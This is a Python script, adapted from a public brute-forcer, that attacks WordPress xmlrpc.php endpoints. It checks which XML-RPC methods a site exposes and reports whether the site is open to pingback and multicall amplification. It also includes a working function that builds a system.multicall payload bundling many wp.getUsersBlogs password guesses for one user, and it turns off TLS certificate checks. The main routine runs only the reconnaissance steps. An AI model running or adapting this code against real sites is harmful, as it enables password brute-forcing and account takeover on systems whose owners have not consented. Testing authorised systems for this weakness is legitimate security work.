import requests
import sys
from html import escape as esc

# Reference: https://github.com/kavishgr/xmlrpc-bruteforcer/blob/master/xmlrpcbruteforce.py

# Silence warnings, hush hush.
requests.packages.urllib3.disable_warnings()

# Insert the IP address containing which has the XMLrpc.php page stored and then send a get request to it.
def verify_target(ip):
    target_url = "https://%s/xmlrpc.php" % (ip)
    send_req = requests.post(target_url, verify=False)
    send_req_status = send_req.status_code
    if send_req_status == 200 or send_req.text == "XML-RPC server accepts POST requests only.":
        print("Found XML-RPC... Proceeding to check for vulns")

    return target_url

def show_xmlrpc_options(url):
    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
    headers = {'Content-Type': "application/xml"}
    req = requests.post(url, data=xmlrpc_methods, headers=headers)

    return req.text

def check_for_calls(url, xml_options):
    payload_check = show_xmlrpc_options(url)
    if "system.multicall" in payload_check and "wp.getUsersBlogs" in payload_check and "pingback.ping" in payload_check:
        print("All calls (system.multicall, wp.getUsersBlogs, pingback.ping) are here, XMLRPC is vulnerable to brute force amplification and pingback")
    elif "pingback.ping" in payload_check and "system.multicall" not in payload_check and "wp.getUsersBlogs" not in payload_check:
        print("pingback.ping is here, XMLRPC is vulnerable to pingback attack")
    else:
        # In case of an issue we'd get this error
        sys.exit("Missing calls for brute force attack, can't go on :(")

# Send this payload numerous times using the system.multicall to bruteforce the passwords for a given user
def brute_xmlrpc_payload(target_url, user, passwords):
    payload_prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    payload_body = ""
    payload_suffix = "</data></array></value></param></params></methodCall>"

    for password in passwords:
        payload_body += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
        payload_body += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
        payload_body += "</data></array></value></data></array></value></member></struct></value>"

    data = payload_prefix + payload_body + payload_suffix
    headers = {"Content-Type": "application/xml"}
    req = requests.post(target_url, data=data, headers=headers)
    req.encoding = 'UTF-8'
    return req.text

def bruteforce(wordlist):
    with open(wordlist) as f:
        lines = f.readlines()
        print(lines)


# Only verify available calls in XMLRPC
def main():
    # IP address is available as a command line argument
    target_ip = sys.argv[1]
    # Wordlist which is available to be used 
    
    # Ensure the target is actually available and we're not just attacking an endpoint which cannot be reached
    target = verify_target(target_ip)
    print("Target url: %s" % target)
    
    options = show_xmlrpc_options(target)
    print("XMLRPC options: %s" % options)

    check_for_calls(target, options)

main()
